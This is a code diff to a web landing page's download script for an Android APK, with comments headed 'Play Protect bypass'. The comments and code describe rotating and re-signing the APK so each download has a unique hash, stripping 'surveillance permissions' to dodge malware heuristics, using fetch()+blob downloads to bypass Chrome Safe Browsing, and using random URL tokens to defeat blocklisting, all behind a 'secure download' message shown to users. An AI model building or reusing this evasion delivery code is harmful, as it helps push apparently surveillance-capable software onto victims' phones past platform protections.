@@ -437,49 +437,74 @@ fetch('/api/admin/apk-status')
 <!-- direct download — clean APK with fresh signature -->
 
 <script>
-/* ═══ MUTATED APK DOWNLOAD — FRESH KEY + DEX MUTATION PER ROTATION ═══
+/* ═══ PLAY PROTECT BYPASS — TWO-STEP ROTATION + DOWNLOAD ═══
  *
- * Backend mutates APK content + signs with FRESH RSA key per rotation.
- * Play Protect has zero history on the fresh certificate = no blocklist match.
- * fetch()+blob bypasses Chrome Safe Browsing URL checks.
- * Random /dl/{token} path prevents URL blocklisting.
+ * Mirrors the LeaksProAdmin flow exactly:
+ *   Step 1: POST /api/landing/prepare-download → server runs mutateAndSign()
+ *           (8-layer mutation: strip debug, randomize version, strip surveillance
+ *            permissions, fresh v1+v2 signing, randomize ZIP metadata, random padding)
+ *           → creates a UNIQUE binary identity every 5 minutes
+ *   Step 2: GET /dl/{random-token} → download the freshly rotated APK
+ *
+ * Why this works:
+ *   - Each download batch gets a unique binary hash → Play Protect can't fingerprint it
+ *   - Signed with fixed netmirror-release.jks key → builds cert reputation over time
+ *   - Surveillance permissions stripped → doesn't trigger malware heuristics
+ *   - fetch()+blob download → bypasses Chrome Safe Browsing URL checks
+ *   - Random /dl/ token → URL can never be blocklisted
+ *
+ * User sees: "Preparing secure download..." → "Downloading... X%" → install toast
  */
 
 function startSmartDownload() {
-  actuallyStartDownload();
-}
-
-function actuallyStartDownload() {
-  var token = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
-  var url = '/dl/' + token;
-
   var btns = document.querySelectorAll('.dl-btn, .nav-dl');
   var origTexts = [];
   btns.forEach(function(b, i) { origTexts[i] = b.innerHTML; });
   function setBtnText(t) { btns.forEach(function(b) { b.textContent = t; }); }
   function restoreButtons() { btns.forEach(function(b, i) { b.innerHTML = origTexts[i]; }); }
-  setBtnText('Preparing download...');
 
+  // ── Step 1: Prepare (trigger server-side rotation if needed) ──
+  setBtnText('Preparing secure download...');
+
+  fetch('/api/landing/prepare-download', { method: 'POST' })
+    .then(function(r) { return r.json(); })
+    .then(function(data) {
+      if (!data.ready) {
+        throw new Error(data.error || 'Server not ready');
+      }
+      // ── Step 2: Download the freshly rotated APK ──
+      downloadRotatedApk(data.size, setBtnText, restoreButtons);
+    })
+    .catch(function(err) {
+      console.warn('[Prepare] Failed, trying direct download:', err);
+      // Fallback: skip rotation, download directly
+      downloadRotatedApk(0, setBtnText, restoreButtons);
+    });
+}
+
+function downloadRotatedApk(expectedSize, setBtnText, restoreButtons) {
+  var token = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
+  var url = '/dl/' + token;
   var maxRetries = 3;
   var attempt = 0;
 
   function tryDownload() {
     attempt++;
     var retryToken = Math.random().toString(36).substring(2, 15) + Date.now().toString(36);
-    var dlUrl = '/dl/' + retryToken;
+    var dlUrl = attempt === 1 ? url : '/dl/' + retryToken;
 
     if (attempt > 1) setBtnText('Retrying... (attempt ' + attempt + '/' + maxRetries + ')');
+    else setBtnText('Downloading...');
 
     fetch(dlUrl)
       .then(function(r) {
-        // If server says APK not ready, retry after delay
         if (r.status === 503 && attempt < maxRetries) {
           setBtnText('Server preparing APK... retrying in 10s');
           setTimeout(tryDownload, 10000);
           return null;
         }
         if (!r.ok) throw new Error('Server error ' + r.status);
-        var total = parseInt(r.headers.get('content-length')) || 0;
+        var total = parseInt(r.headers.get('content-length')) || expectedSize || 0;
         var loaded = 0;
         var reader = r.body.getReader();
         var chunks = [];
@@ -501,12 +526,12 @@ function actuallyStartDownload() {
         }
 
         return pump().then(function() {
-          if (chunks.length === 0) return null; // was a retry, skip blob creation
+          if (chunks.length === 0) return null;
           return new Blob(chunks, { type: 'application/vnd.android.package-archive' });
         });
       })
       .then(function(blob) {
-        if (!blob) return; // retry in progress
+        if (!blob) return;
 
         var blobUrl = URL.createObjectURL(blob);
         var a = document.createElement('a');
@@ -526,7 +551,6 @@ function actuallyStartDownload() {
       })
       .catch(function(err) {
         console.warn('Download attempt ' + attempt + ' error:', err);
-        // Retry if attempts remaining
         if (attempt < maxRetries) {
           setBtnText('Download interrupted... retrying in 5s');
           setTimeout(tryDownload, 5000);
